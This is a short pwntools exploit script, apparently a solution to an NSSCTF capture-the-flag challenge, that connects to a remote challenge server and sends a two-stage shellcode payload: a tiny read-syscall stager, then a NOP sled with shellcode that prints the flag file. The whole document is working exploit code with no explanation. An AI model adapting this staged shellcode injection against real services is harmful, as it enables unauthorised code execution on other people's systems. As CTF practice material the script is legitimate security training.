from pwn import *

p = process('vuln')
p = remote("node5.anna.nssctf.cn",22336)
context.arch = "amd64"

sc = """
xor rdi,rdi
mov rsi,rdx
syscall
"""
sc  = asm(sc)
#gdb.attach(p)
p.sendline(sc)

sc = asm(shellcraft.cat('./flag'))
pay = b"\x90"*0x20 + sc
p.sendline(pay)

p.interactive()